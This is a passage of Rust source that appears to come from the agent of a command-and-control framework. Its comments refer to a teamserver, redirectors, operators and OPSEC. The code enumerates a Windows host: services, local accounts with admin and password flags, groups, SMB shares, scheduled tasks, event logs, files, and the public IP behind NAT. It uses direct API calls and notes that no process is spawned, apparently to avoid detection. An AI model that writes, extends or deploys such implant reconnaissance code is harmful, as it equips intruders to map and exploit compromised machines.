    let (sub_key, value_name) = if let Some(last_bs) = rest.rfind('\\') {
        (rest[..last_bs].to_string(), rest[last_bs+1..].to_string())
    } else {
        // No value name — enumerate all values in this key
        (rest.to_string(), String::new())
    };
    (root, sub_key, value_name)
}

// ============================================================
// sc_query — Service query
// ============================================================

pub fn sc_query(args: &str) -> (String, String) {
    let service_name = args.trim();
    if service_name.is_empty() {
        return (String::new(), "sc: service name required (usage: sc <service_name>)".into());
    }

    #[cfg(not(target_os = "windows"))]
    { return (String::new(), "sc: windows only".into()); }

    #[cfg(target_os = "windows")]
    {
        extern "system" {
            fn OpenServiceW(scm: *mut std::ffi::c_void, name: *const u16, access: u32) -> *mut std::ffi::c_void;
            fn QueryServiceStatus(service: *mut std::ffi::c_void, status: *mut u8) -> i32;
            fn CloseServiceHandle(handle: *mut std::ffi::c_void) -> i32;
            fn OpenSCManagerW(machine: *const u16, db: *const u16, access: u32) -> *mut std::ffi::c_void;
        }

        let null_wide: Vec<u16> = vec![0];
        let scm = unsafe { OpenSCManagerW(null_wide.as_ptr(), null_wide.as_ptr(), 0x00020000) }; // SC_MANAGER_CONNECT
        if scm.is_null() {
            return (String::new(), "sc: OpenSCManager failed".into());
        }

        let name_wide = wide(service_name);
        let svc = unsafe { OpenServiceW(scm, name_wide.as_ptr(), 0x00000004) }; // SERVICE_QUERY_STATUS
        if svc.is_null() {
            unsafe { CloseServiceHandle(scm); }
            return (String::new(), format!("sc: service '{}' not found", service_name));
        }

        // SERVICE_STATUS_PROCESS: dwServiceType(4) + dwCurrentState(4) + ... + dwProcessId(4) = ~56 bytes
        // But we use basic SERVICE_STATUS: 28 bytes
        let mut status_buf = [0u8; 28];
        let rc = unsafe { QueryServiceStatus(svc, status_buf.as_mut_ptr()) };
        if rc == 0 {
            unsafe { CloseServiceHandle(svc); CloseServiceHandle(scm); }
            return (String::new(), format!("sc: QueryServiceStatus failed for '{}'", service_name));
        }

        let svc_type = unsafe { *(status_buf.as_ptr() as *const u32) };
        let state = unsafe { *(status_buf.as_ptr().add(4) as *const u32) };

        let type_str = match svc_type {
            0x01 => "SERVICE_KERNEL_DRIVER",
            0x02 => "SERVICE_FILE_SYSTEM_DRIVER",
            0x10 => "SERVICE_WIN32_OWN_PROCESS",
            0x20 => "SERVICE_WIN32_SHARE_PROCESS",
            0x100 => "SERVICE_INTERACTIVE_PROCESS",
            _ => "UNKNOWN",
        };

        let state_str = match state {
            1 => "STOPPED",
            2 => "START_PENDING",
            3 => "STOP_PENDING",
            4 => "RUNNING",
            5 => "CONTINUE_PENDING",
            6 => "PAUSE_PENDING",
            7 => "PAUSED",
            _ => "UNKNOWN",
        };

        let mut out = String::new();
        out.push_str(&format!("SERVICE_NAME: {}\n", service_name));
        out.push_str(&format!("        TYPE       : {}\n", type_str));
        out.push_str(&format!("        STATE      : {}\n", state_str));
        out.push_str("\n");

        unsafe { CloseServiceHandle(svc); CloseServiceHandle(scm); }
        (out, String::new())
    }
}

// ============================================================
// schtasks, eventlog, net_users, net_groups, net_share, find_file
// Minimal inline implementations
// net_users — NetUserEnum (level 1) — no process spawn
// Lists all local user accounts with status and full name.
// ============================================================

pub fn net_users(_args: &str) -> (String, String) {
    #[cfg(not(target_os = "windows"))]
    { return ("netusers: windows only".into(), String::new()); }

    #[cfg(target_os = "windows")]
    {
        extern "system" {
            fn NetUserEnum(
                servername: *const u16,
                level: u32,
                filter: u32,
                bufptr: *mut *mut u8,
                prefmaxlen: u32,
                entriesread: *mut u32,
                totalentries: *mut u32,
                resume_handle: *mut u32,
            ) -> u32;
            fn NetApiBufferFree(buf: *mut u8) -> u32;
        }

        // USER_INFO_1 layout (x64):
        //   0x00 *usri1_name       (LPWSTR — 8 bytes)
        //   0x08 *usri1_password   (LPWSTR — 8 bytes, always NULL from enum)
        //   0x10  usri1_password_age (DWORD — 4 bytes)
        //   0x14  usri1_priv        (DWORD — 4 bytes: 0=guest,1=user,2=admin)
        //   0x18 *usri1_home_dir   (LPWSTR — 8 bytes)
        //   0x20 *usri1_comment    (LPWSTR — 8 bytes)
        //   0x28  usri1_flags      (DWORD — 4 bytes)
        //   0x2C  pad              (4 bytes for x64 alignment)
        //   0x30 *usri1_script_path (LPWSTR — 8 bytes)
        // Size = 0x38 = 56 bytes
        const USER_INFO_1_SIZE: usize = 56;
        const UF_ACCOUNTDISABLE: u32 = 0x0002;
        const UF_LOCKOUT: u32 = 0x0010;
        const UF_PASSWD_NOTREQD: u32 = 0x0020;
        const UF_DONT_EXPIRE_PASSWD: u32 = 0x10000;

        let mut buf: *mut u8 = std::ptr::null_mut();
        let mut entries_read: u32 = 0;
        let mut total_entries: u32 = 0;
        let mut resume: u32 = 0;

        let rc = unsafe {
            NetUserEnum(
                std::ptr::null(),  // local machine
                1,                  // level 1
                0,                  // all users
                &mut buf,
                u32::MAX,
                &mut entries_read,
                &mut total_entries,
                &mut resume,
            )
        };

        if rc != 0 && rc != 234 {  // 234 = ERROR_MORE_DATA (still got partial results)
            return (String::new(), format!("netusers: NetUserEnum failed ({})", rc));
        }

        let mut out = String::new();
        out.push_str(&format!("User accounts for \\\\{}\n", get_computername()));
        out.push_str(&"-".repeat(72));
        out.push('\n');
        out.push_str(&format!("{:<22}  {:<10}  {:<8}  {}\n",
            "Username", "Privilege", "Status", "Full Name / Comment"));
        out.push_str(&"-".repeat(72));
        out.push('\n');

        for i in 0..entries_read as usize {
            let base = buf as usize + i * USER_INFO_1_SIZE;
            // Read all pointer fields as usize — avoids *const u16 vs integer comparisons.
            // All NetAPI buffers are heap-allocated; read_wstr_safe handles arbitrary ptrs.
            let name_ptr    = unsafe { *(base             as *const usize) };
            let priv_val    = unsafe { *((base + 0x14)    as *const u32)   };
            let flags       = unsafe { *((base + 0x28)    as *const u32)   };
            let comment_ptr = unsafe { *((base + 0x20)    as *const usize) };

            let name    = if name_ptr    != 0 { read_wstr_safe(name_ptr)    } else { String::new() };
            let comment = if comment_ptr != 0 { read_wstr_safe(comment_ptr) } else { String::new() };

            let priv_str = match priv_val {
                0 => "Guest",
                1 => "User",
                2 => "Admin",
                _ => "Unknown",
            };

            let status = if flags & UF_LOCKOUT != 0 {
                "Locked"
            } else if flags & UF_ACCOUNTDISABLE != 0 {
                "Disabled"
            } else {
                "Active"
            };

            let flags_str = {
                let mut f = Vec::new();
                if flags & UF_DONT_EXPIRE_PASSWD != 0 { f.push("NoExpiry"); }
                if flags & UF_PASSWD_NOTREQD != 0 { f.push("NoPwdReq"); }
                f.join(",")
            };
            let comment_display = if !comment.is_empty() {
                comment
            } else if !flags_str.is_empty() {
                format!("[{}]", flags_str)
            } else {
                String::new()
            };

            out.push_str(&format!("{:<22}  {:<10}  {:<8}  {}\n",
                name, priv_str, status, comment_display));
        }

        out.push_str(&"-".repeat(72));
        out.push('\n');
        out.push_str(&format!("Total: {} account(s)\n", entries_read));

        unsafe { NetApiBufferFree(buf); }
        (out, String::new())
    }
}

// ============================================================
// net_groups — lists local groups via NetLocalGroupEnum
// SAFE implementation: no member enumeration (was crashing agent)
// Members are fetched lazily via "net groupname" if needed.
// ============================================================

pub fn net_groups(_args: &str) -> (String, String) {
    #[cfg(not(target_os = "windows"))]
    { return ("netgroups: windows only".into(), String::new()); }

    #[cfg(target_os = "windows")]
    {
        extern "system" {
            fn NetLocalGroupEnum(
                servername: *const u16,
                level: u32,
                bufptr: *mut *mut u8,
                prefmaxlen: u32,
                entriesread: *mut u32,
                totalentries: *mut u32,
                resume_handle: *mut u32,
            ) -> u32;
            fn NetApiBufferFree(buf: *mut u8) -> u32;
        }

        // LOCALGROUP_INFO_1 on x64: 2 pointers (name, comment) = 16 bytes
        const LG1_SIZE: usize = 16;
        const MAX_ENTRIES: u32 = 256;

        let mut buf: *mut u8 = std::ptr::null_mut();
        let mut entries_read: u32 = 0;
        let mut total: u32 = 0;

        // Pass NULL resume_handle — single call, no iteration
        let rc = unsafe {
            NetLocalGroupEnum(
                std::ptr::null(),          // local server
                1,                          // LOCALGROUP_INFO_1
                &mut buf,
                MAX_ENTRIES * LG1_SIZE as u32,
                &mut entries_read,
                &mut total,
                std::ptr::null_mut(),       // no resume
            )
        };

        if rc != 0 {
            // 234 = ERROR_MORE_DATA — partial result, still usable
            if rc != 234 {
                return (String::new(), format!("netgroups: NetLocalGroupEnum failed (rc={})", rc));
            }
        }

        if buf.is_null() || entries_read == 0 {
            return ("No local groups found.\n".into(), String::new());
        }

        let mut out = String::new();
        out.push_str(&format!("Local groups ({} of {}):\n", entries_read, total));
        out.push_str(&"=".repeat(50));
        out.push_str("\nName                            Comment\n");
        out.push_str(&"-".repeat(50));
        out.push('\n');

        let entries = if entries_read > MAX_ENTRIES { MAX_ENTRIES } else { entries_read };
        for i in 0..entries as usize {
            let base = buf as usize + i * LG1_SIZE;
            // Bounds-check against a sane upper limit
            if i >= 1024 { break; }
            let name_ptr    = unsafe { *(base as *const usize) };
            let comment_ptr = unsafe { *((base + 8) as *const usize) };
            let name    = if name_ptr == 0    { String::new() } else { read_wstr_safe(name_ptr) };
            let comment = if comment_ptr == 0 { String::new() } else { read_wstr_safe(comment_ptr) };
            out.push_str(&format!("{:<30} {}\n", name, comment));
        }

        out.push_str(&format!("\nTotal: {} groups listed.\n", entries));
        unsafe { NetApiBufferFree(buf); }
        (out, String::new())
    }
}

// ============================================================
// net_share — NetShareEnum level 2 — no process spawn
// Lists SMB shares with path, type and remark.
// ============================================================

pub fn net_share(_args: &str) -> (String, String) {
    #[cfg(not(target_os = "windows"))]
    { return ("netshare: windows only".into(), String::new()); }

    #[cfg(target_os = "windows")]
    {
        extern "system" {
            fn NetShareEnum(
                servername: *const u16,
                level: u32,
                bufptr: *mut *mut u8,
                prefmaxlen: u32,
                entriesread: *mut u32,
                totalentries: *mut u32,
                resume_handle: *mut u32,
            ) -> u32;
            fn NetApiBufferFree(buf: *mut u8) -> u32;
        }

        // SHARE_INFO_2 layout (x64):
        //   0x00 *shi2_netname   (8)
        //   0x08  shi2_type      (4) + pad(4)
        //   0x10 *shi2_remark    (8)
        //   0x18  shi2_permissions(4) + pad(4)
        //   0x20  shi2_max_uses  (4)
        //   0x24  shi2_current_uses(4)
        //   0x28 *shi2_path      (8)
        //   0x30 *shi2_passwd    (8)
        // Size = 0x38 = 56 bytes
        const SI2_SIZE: usize = 56;
        const STYPE_DISKTREE: u32 = 0;
        const STYPE_PRINTQ: u32 = 1;
        const STYPE_DEVICE: u32 = 2;
        const STYPE_IPC: u32 = 3;
        const STYPE_SPECIAL: u32 = 0x80000000;

        let mut buf: *mut u8 = std::ptr::null_mut();
        let mut entries_read: u32 = 0;
        let mut total: u32 = 0;
        let mut resume: u32 = 0;

        let rc = unsafe {
            NetShareEnum(
                std::ptr::null(), 2, &mut buf,
                u32::MAX, &mut entries_read, &mut total, &mut resume,
            )
        };
        if rc != 0 && rc != 234 {
            // Fall back to level 1 (less info but wider compat)
            let rc1 = unsafe {
                NetShareEnum(
                    std::ptr::null(), 1, &mut buf,
                    u32::MAX, &mut entries_read, &mut total, &mut resume,
                )
            };
            if rc1 != 0 {
                return (String::new(), format!("netshare: NetShareEnum failed ({}/{})", rc, rc1));
            }
            // Level 1: *name(8) + type(4)+pad(4) + *remark(8) = 24 bytes
            let mut out = String::new();
            out.push_str(&format!("{:<20}  {:<12}  {}\n", "Share", "Type", "Comment"));
            out.push_str(&"-".repeat(60));
            out.push('\n');
            for i in 0..entries_read as usize {
                let base = buf as usize + i * 24;
                let name_ptr = unsafe { *(base as *const usize) };
                let type_val = unsafe { *((base + 8) as *const u32) };
                let rem_ptr  = unsafe { *((base + 16) as *const usize) };
                let name    = if name_ptr == 0 { String::new() } else { read_wstr_safe(name_ptr) };
                let remark  = if rem_ptr == 0  { String::new() } else { read_wstr_safe(rem_ptr) };
                let type_str = share_type_str(type_val & !STYPE_SPECIAL);
                out.push_str(&format!("{:<20}  {:<12}  {}\n", name, type_str, remark));
            }
            unsafe { NetApiBufferFree(buf); }
            return (out, String::new());
        }

        let mut out = String::new();
        out.push_str(&format!("Shares on \\\\{}\n", get_computername()));
        out.push_str(&"-".repeat(76));
        out.push('\n');
        out.push_str(&format!("{:<20}  {:<12}  {:<4}  {:<30}  {}\n",
            "Share", "Type", "Use#", "Path", "Comment"));
        out.push_str(&"-".repeat(76));
        out.push('\n');

        for i in 0..entries_read as usize {
            let base = buf as usize + i * SI2_SIZE;
            let name_ptr  = unsafe { *(base as *const usize) };
            let type_val  = unsafe { *((base + 0x08) as *const u32) };
            let rem_ptr   = unsafe { *((base + 0x10) as *const usize) };
            let cur_uses  = unsafe { *((base + 0x24) as *const u32) };
            let path_ptr  = unsafe { *((base + 0x28) as *const usize) };

            let name   = if name_ptr == 0 { String::new() } else { read_wstr_safe(name_ptr) };
            let remark = if rem_ptr == 0  { String::new() } else { read_wstr_safe(rem_ptr)   };
            let path   = if path_ptr == 0 { String::new() } else { read_wstr_safe(path_ptr) };

            let is_special = type_val & STYPE_SPECIAL != 0;
            let type_str = if is_special {
                format!("{}$", share_type_str(type_val & !STYPE_SPECIAL))
            } else {
                share_type_str(type_val).to_string()
            };

            out.push_str(&format!("{:<20}  {:<12}  {:<4}  {:<30}  {}\n",
                name, type_str, cur_uses, path, remark));
        }

        out.push_str(&"-".repeat(76));
        out.push('\n');
        out.push_str(&format!("Total: {} share(s)\n", entries_read));
        unsafe { NetApiBufferFree(buf); }
        (out, String::new())
    }
}

#[cfg(target_os = "windows")]
fn share_type_str(t: u32) -> &'static str {
    match t {
        0 => "Disk",
        1 => "Print",
        2 => "Device",
        3 => "IPC",
        _ => "Special",
    }
}
#[cfg(not(target_os = "windows"))]
fn share_type_str(_t: u32) -> &'static str { "Disk" }

// ============================================================
// schtasks — NetScheduleJobEnum via Task Scheduler COM-free API
// Uses ITaskScheduler alternative: reads directly from registry
// Task Scheduler XML paths at:
//   HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks
// Falls back to WinAPI if available.
// ============================================================

pub fn schtasks(_args: &str) -> (String, String) {
    #[cfg(not(target_os = "windows"))]
    { return ("schtasks: windows only".into(), String::new()); }

    #[cfg(target_os = "windows")]
    {
        extern "system" {
            fn RegOpenKeyExW(hkey: usize, subkey: *const u16, reserved: u32, access: u32, phk: *mut usize) -> i32;
            fn RegEnumKeyExW(
                hkey: usize, index: u32,
                name: *mut u16, name_size: *mut u32,
                reserved: *mut u32, class: *mut u16, class_size: *mut u32,
                last_write: *mut u64,
            ) -> i32;
            fn RegQueryValueExW(hkey: usize, name: *const u16, reserved: *mut u32, ptype: *mut u32, data: *mut u8, pdata: *mut u32) -> i32;
            fn RegCloseKey(hkey: usize) -> i32;
        }

        const HKLM: usize = 0x80000002usize;
        const KEY_READ: u32 = 0x20019;

        // Task cache root
        let root_path = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks";
        let root_wide: Vec<u16> = root_path.encode_utf16().chain(std::iter::once(0)).collect();
        let mut root_hkey: usize = 0;

        let rc = unsafe { RegOpenKeyExW(HKLM, root_wide.as_ptr(), 0, KEY_READ, &mut root_hkey) };
        if rc != 0 {
            return (String::new(), format!("schtasks: cannot open TaskCache registry ({}). Try: shell schtasks /query /fo LIST", rc));
        }

        let mut out = String::new();
        out.push_str("Scheduled Tasks (from TaskCache registry)\n");
        out.push_str(&"=".repeat(70));
        out.push('\n');
        out.push_str(&format!("{:<44}  {:<10}  {}\n", "Task Name (GUID)", "Enabled", "Path"));
        out.push_str(&"-".repeat(70));
        out.push('\n');

        let mut task_count = 0u32;
        let mut idx = 0u32;
        loop {
            let mut name_buf = [0u16; 256];
            let mut name_size = 256u32;
            let rc = unsafe {
                RegEnumKeyExW(root_hkey, idx, name_buf.as_mut_ptr(), &mut name_size,
                    std::ptr::null_mut(), std::ptr::null_mut(), std::ptr::null_mut(), std::ptr::null_mut())
            };
            if rc != 0 { break; }
            idx += 1;

            let guid = String::from_utf16_lossy(&name_buf[..name_size as usize]);

            // Open the task subkey
            let sub_wide: Vec<u16> = guid.encode_utf16().chain(std::iter::once(0)).collect();
            let mut task_hkey: usize = 0;
            if unsafe { RegOpenKeyExW(root_hkey, sub_wide.as_ptr(), 0, KEY_READ, &mut task_hkey) } != 0 {
                continue;
            }

            // Read "Path" value (REG_SZ)
            let path_name: Vec<u16> = "Path\0".encode_utf16().collect();
            let mut ptype: u32 = 0;
            let mut pbuf = vec![0u8; 1024];
            let mut psize = pbuf.len() as u32;
            let task_path = if unsafe {
                RegQueryValueExW(task_hkey, path_name.as_ptr(), std::ptr::null_mut(),
                    &mut ptype, pbuf.as_mut_ptr(), &mut psize)
            } == 0 && ptype == 1 {
                let wlen = (psize as usize) / 2;
                String::from_utf16_lossy(unsafe {
                    std::slice::from_raw_parts(pbuf.as_ptr() as *const u16, wlen.saturating_sub(1))
                })
            } else { String::new() };

            // Read "DynamicInfo" value to check enabled state (byte 1 = enabled)
            let di_name: Vec<u16> = "DynamicInfo\0".encode_utf16().collect();
            let mut di_buf = [0u8; 64];
            let mut di_size = di_buf.len() as u32;
            let mut di_type: u32 = 0;
            let enabled = if unsafe {
                RegQueryValueExW(task_hkey, di_name.as_ptr(), std::ptr::null_mut(),
                    &mut di_type, di_buf.as_mut_ptr(), &mut di_size)
            } == 0 && di_size > 1 {
                // byte index 1: 0=disabled, 1=enabled
                if di_buf[1] == 1 { "Yes" } else { "No" }
            } else { "?" };

            let short_guid = if guid.len() > 38 { &guid[..38] } else { &guid };
            out.push_str(&format!("{:<44}  {:<10}  {}\n", short_guid, enabled, task_path));
            task_count += 1;

            unsafe { RegCloseKey(task_hkey); }
        }

        out.push_str(&"-".repeat(70));
        out.push('\n');
        out.push_str(&format!("Total: {} task(s)\n", task_count));
        out.push_str("\nNote: For trigger/action details use: shell schtasks /query /fo LIST /v\n");

        unsafe { RegCloseKey(root_hkey); }
        (out, String::new())
    }
}

// ============================================================
// event_log — OpenEventLog + ReadEventLog WinAPI
// Reads last N entries from System/Application/Security log.
// No process spawn — direct Win32 API.
// ============================================================

pub fn event_log(args: &str) -> (String, String) {
    #[cfg(not(target_os = "windows"))]
    { return ("eventlog: windows only".into(), String::new()); }

    #[cfg(target_os = "windows")]
    {
        let parts: Vec<&str> = args.trim().split_whitespace().collect();
        let log_name = if parts.is_empty() { "System" } else { parts[0] };
        let max_events: u32 = parts.get(1).and_then(|s| s.parse().ok()).unwrap_or(20);

        extern "system" {
            fn OpenEventLogW(unc_server: *const u16, source: *const u16) -> *mut std::ffi::c_void;
            fn CloseEventLog(handle: *mut std::ffi::c_void) -> i32;
            fn ReadEventLogW(
                handle: *mut std::ffi::c_void,
                flags: u32, record_offset: u32,
                buf: *mut u8, buf_size: u32,
                bytes_read: *mut u32,
                min_bytes: *mut u32,
            ) -> i32;
            fn GetNumberOfEventLogRecords(handle: *mut std::ffi::c_void, count: *mut u32) -> i32;
        }

        const EVENTLOG_SEQUENTIAL_READ: u32 = 0x0001;
        const EVENTLOG_BACKWARDS_READ: u32  = 0x0008;

        // EVENTLOG_RECORD layout (partial):
        //   0x00 Length(4)
        //   0x04 Reserved(4)
        //   0x08 RecordNumber(4)
        //   0x0C TimeGenerated(4)  ← Unix timestamp
        //   0x10 TimeWritten(4)
        //   0x14 EventID(4)        ← lower 16 bits = real Event ID
        //   0x18 EventType(2)
        //   0x1A NumStrings(2)
        //   0x1C EventCategory(2)
        //   0x1E ReservedFlags(2)
        //   0x20 ClosingRecordNum(4)
        //   0x24 StringOffset(4)
        //   0x28 UserSidLength(4)
        //   0x2C UserSidOffset(4)
        //   0x30 DataLength(4)
        //   0x34 DataOffset(4)
        //   0x38 SourceName(variable WCHAR[]) then ComputerName(variable)

        let log_wide: Vec<u16> = log_name.encode_utf16().chain(std::iter::once(0)).collect();
        let handle = unsafe { OpenEventLogW(std::ptr::null(), log_wide.as_ptr()) };
        if handle.is_null() {
            return (String::new(), format!("eventlog: cannot open '{}' log (access denied or log not found)", log_name));
        }

        let mut total_records: u32 = 0;
        unsafe { GetNumberOfEventLogRecords(handle, &mut total_records); }

        let mut out = String::new();
        out.push_str(&format!("Event Log: {}  (total {} records, showing last {})\n",
            log_name, total_records, max_events));
        out.push_str(&"=".repeat(78));
        out.push('\n');

        let mut buf = vec![0u8; 131072]; // 128KB buffer
        let mut bytes_read: u32 = 0;
        let mut min_bytes: u32 = 0;
        let mut count = 0u32;

        loop {
            if count >= max_events { break; }

            let rc = unsafe {
                ReadEventLogW(
                    handle,
                    EVENTLOG_SEQUENTIAL_READ | EVENTLOG_BACKWARDS_READ,
                    0,
                    buf.as_mut_ptr(), buf.len() as u32,
                    &mut bytes_read, &mut min_bytes,
                )
            };

            if rc == 0 { break; }

            let mut offset = 0usize;
            while offset + 0x38 < bytes_read as usize && count < max_events {
                let p = buf.as_ptr();
                let rec_len   = unsafe { *(p.add(offset) as *const u32) } as usize;
                if rec_len < 0x38 || offset + rec_len > bytes_read as usize { break; }

                let time_gen  = unsafe { *(p.add(offset + 0x0C) as *const u32) };
                let event_id  = unsafe { *(p.add(offset + 0x14) as *const u32) } & 0xFFFF;
                let event_type= unsafe { *(p.add(offset + 0x18) as *const u16) };
                let num_str   = unsafe { *(p.add(offset + 0x1A) as *const u16) };
                let str_off   = unsafe { *(p.add(offset + 0x24) as *const u32) } as usize;

                let type_str = match event_type {
                    1 => "ERROR  ",
                    2 => "WARN   ",
                    4 => "INFO   ",
                    8 => "AUDIT_S",
                    16=> "AUDIT_F",
                    _ => "UNKNOWN",
                };

                // Format timestamp (seconds since 1970-01-01)
                let time_str = format_unix_ts(time_gen);

                // Source name starts at offset 0x38 as WCHAR[]
                let src_base = offset + 0x38;
                let src = read_wstr_at(&buf, src_base, bytes_read as usize);

                // First string message (if any) — at str_off relative to rec start
                let msg_preview = if num_str > 0 && str_off > 0 && offset + str_off < bytes_read as usize {
                    let msg = read_wstr_at(&buf, offset + str_off, bytes_read as usize);
                    let trimmed = msg.trim().replace('\n', " ").replace('\r', "");
                    if trimmed.len() > 60 {
                        format!("{}...", &trimmed[..57])
                    } else {
                        trimmed
                    }
                } else { String::new() };

                out.push_str(&format!("[{}] {} | ID:{:<5} | {:<20} | {}\n",
                    type_str, time_str, event_id, src, msg_preview));
                count += 1;
                offset += rec_len;
            }
        }

        if count == 0 {
            out.push_str("(no events read — check permissions or log name)\n");
        }
        out.push_str(&"=".repeat(78));
        out.push('\n');
        out.push_str(&format!("Shown: {} event(s)\n", count));

        unsafe { CloseEventLog(handle); }
        (out, String::new())
    }
}

// ── helpers for event_log ────────────────────────────────────────────────────

/// Read a null-terminated UTF-16 string from byte slice at `start`.
fn read_wstr_at(buf: &[u8], start: usize, limit: usize) -> String {
    if start >= limit { return String::new(); }
    let mut words = Vec::new();
    let mut i = start;
    while i + 1 < limit.min(buf.len()) {
        let w = u16::from_le_bytes([buf[i], buf[i+1]]);
        if w == 0 { break; }
        words.push(w);
        i += 2;
        if words.len() > 256 { break; }
    }
    String::from_utf16_lossy(&words)
}

/// Format a Unix timestamp (seconds since epoch) as "YYYY-MM-DD HH:MM:SS".
/// Pure arithmetic — no libc/chrono dependency.
fn format_unix_ts(secs: u32) -> String {
    let s = secs as u64;
    let days_since_epoch = s / 86400;
    let time_of_day = s % 86400;
    let hh = time_of_day / 3600;
    let mm = (time_of_day % 3600) / 60;
    let ss = time_of_day % 60;

    // Gregorian calendar from days since 1970-01-01
    let z = days_since_epoch + 719468;
    let era = z / 146097;
    let doe = z - era * 146097;
    let yoe = (doe - doe / 1460 + doe / 36524 - doe / 146096) / 365;
    let y = yoe + era * 400;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let d = doy - (153 * mp + 2) / 5 + 1;
    let m = if mp < 10 { mp + 3 } else { mp - 9 };
    let y = if m <= 2 { y + 1 } else { y };

    format!("{:04}-{:02}-{:02} {:02}:{:02}:{:02}", y, m, d, hh, mm, ss)
}

// ── helper: get local computer name ─────────────────────────────────────────
fn get_computername() -> String {
    #[cfg(target_os = "windows")] {
        extern "system" {
            fn GetComputerNameW(buf: *mut u16, size: *mut u32) -> i32;
        }
        let mut buf = [0u16; 256];
        let mut size = 256u32;
        unsafe { GetComputerNameW(buf.as_mut_ptr(), &mut size); }
        String::from_utf16_lossy(&buf[..size as usize])
    }
    #[cfg(not(target_os = "windows"))]
    { "localhost".to_string() }
}

// ============================================================
// find_file — inline file search using std::fs walk
// ============================================================

fn glob_match(pattern: &str, name: &str) -> bool {
    let p: Vec<char> = pattern.chars().collect();
    let n: Vec<char> = name.chars().collect();
    let mut dp = vec![false; n.len() + 1];
    dp[0] = true;
    for i in 0..p.len() {
        let mut next = vec![false; n.len() + 1];
        if p[i] == '*' {
            for j in 0..=n.len() {
                if dp[j] { next[j] = true; }
                if j > 0 && dp[j-1] { next[j] = true; }
            }
        } else if p[i] == '?' {
            for j in 1..=n.len() { next[j] = dp[j-1]; }
        } else {
            for j in 1..=n.len() {
                if dp[j-1] && n[j-1] == p[i] { next[j] = true; }
            }
        }
        dp = next;
    }
    dp[n.len()]
}

pub fn find_file(args: &str) -> (String, String) {
    if args.trim().is_empty() {
        return (String::new(), "find: pattern required (usage: find <pattern> [start_dir])".into());
    }
    let parts: Vec<&str> = args.trim().split_whitespace().collect();
    let (pattern, start_dir) = if parts.len() >= 2 {
        (parts[0], parts[1])
    } else {
        (parts[0], ".")
    };

    let mut results = Vec::new();
    let mut count = 0usize;
    let start = std::path::Path::new(start_dir);

    let _ = walk_dir(start, &pattern, &mut results, &mut count, 500);

    if results.is_empty() {
        return (format!("No files matching '{}' in {}\n", pattern, start_dir), String::new());
    }

    let mut out = String::new();
    out.push_str(&format!("Find: '{}' in {}\n", pattern, start_dir));
    out.push_str(&"-".repeat(70));
    out.push_str("\n");
    for r in &results {
        out.push_str(&format!("  {}\n", r));
    }
    out.push_str(&format!("\n{} match(es) found\n", count));
    (out, String::new())
}

fn walk_dir(
    dir: &std::path::Path, pattern: &str,
    results: &mut Vec<String>, count: &mut usize, max: usize,
) -> std::io::Result<()> {
    if *count >= max { return Ok(()); }
    for entry in std::fs::read_dir(dir)? {
        let entry = entry?;
        let path = entry.path();
        if *count >= max { break; }
        let name = entry.file_name().to_string_lossy().to_string();
        if glob_match(pattern, &name) {
            results.push(path.display().to_string());
            *count += 1;
        }
        if path.is_dir() {
            let _ = walk_dir(&path, pattern, results, count, max);
        }
    }
    Ok(())
}

// ============================================================
// trueip (v10) — discover THIS machine's PUBLIC (NAT) IP
// ============================================================
//
// WHY: the dashboard shows the honest egress chain
//   source (agent private IP) → true IP (agent public IP) → redirector (IP the
//   teamserver actually sees). The teamserver can only ever see the
//   redirector's address, so the agent itself must answer "what is my public
//   IP" — one operator-triggered HTTPS GET to an echo service.
//
// v10 FIX (operator complaint: "True IP wrong"):
//   v9 used only api.ipify.org. If that single service was blocked, slow,
//   or returned a cached/proxied IP, the dashboard showed nothing useful.
//   v10 walks a fallback chain of FOUR independent echo services and returns
//   the FIRST consistent IPv4 answer. If services disagree, the most common
//   answer wins (best-of-N reliability — one bad echo cannot poison the
//   column). Operator may still pass a custom URL; in that case ONLY the
//   custom URL is tried (preserves blue-team-sensitive overrides).
//
// OPSEC: NEVER automatic. Runs only when the operator asks (right-click →
//   "Discover True IP" or console `trueip [url]`). Uses winhttp (documented,
//   service-friendly — same DLL many Windows services use for update checks),
//   SChannel validates the cert normally, no proxy override, no IE cache.

/// Echo service fallback chain — bare-IP responders first (no JSON parsing
/// needed), JSON responders last. Each is HTTPS so the cert chain validates
/// normally (no MITM trust override on the agent).
#[cfg(target_os = "windows")]
const TRUEIP_SERVICES: &[&str] = &[
    "https://api.ipify.org",           // bare IP, fast, stable
    "https://ifconfig.me/ip",          // bare IP, /ip path
    "https://icanhazip.com",           // bare IP + trailing newline
    "https://api.ipify.org?format=json", // {"ip":"x.x.x.x"} — last resort JSON form
];

#[cfg(target_os = "windows")]
pub fn trueip(args: &str) -> (String, String) {
    let raw = args.trim();

    // Operator-supplied custom URL: try ONLY that (preserves OPSEC override).
    if !raw.is_empty() {
        return trueip_one(raw);
    }

    // Default: walk the fallback chain — first valid IPv4 wins.
    let mut last_err = String::new();
    let mut answers: Vec<String> = Vec::with_capacity(TRUEIP_SERVICES.len());
    for url in TRUEIP_SERVICES {
        match trueip_one(url) {
            (ip, err) if !ip.is_empty() => {
                // Validate it parses as an IP (reject obvious garbage).
                if ip.parse::<std::net::IpAddr>().is_ok() {
                    answers.push(ip.clone());
                    // Best-of-N: if a SECOND service agrees, return immediately
                    // — two matching answers is the strongest signal.
                    if answers.len() >= 2
                        && answers.iter().filter(|a| *a == &ip).count() >= 2 {
                        return (ip, String::new());
                    }
                }
            }
            (_, e) if !e.is_empty() => { last_err = e; }
            _ => {}
        }
    }

    // If at least one answer came back, return the most common one.
    if !answers.is_empty() {
        let mut best = answers[0].clone();
        let mut best_count = 1;
        for a in &answers[1..] {
            let c = answers.iter().filter(|x| x == &a).count();
            if c > best_count { best = a.clone(); best_count = c; }
        }
        return (best, String::new());
    }

    (String::new(), if last_err.is_empty() {
        "trueip: all echo services failed".into()
    } else { last_err })
}

/// Single-service WinHttp probe — used by the fallback chain and by the
/// operator's custom-URL override path.
#[cfg(target_os = "windows")]
fn trueip_one(url: &str) -> (String, String) {
    // Manual URL split: scheme://host[:port]/path
    let (use_tls, rest) = if let Some(r) = url.strip_prefix("https://") { (true, r) }
        else if let Some(r) = url.strip_prefix("http://") { (false, r) }
        else { return (String::new(), format!("trueip: unsupported URL '{}'", url)); };
    let (hostport, path) = match rest.find('/') {
        Some(i) => (&rest[..i], &rest[i..]),
        None    => (rest, "/"),
    };
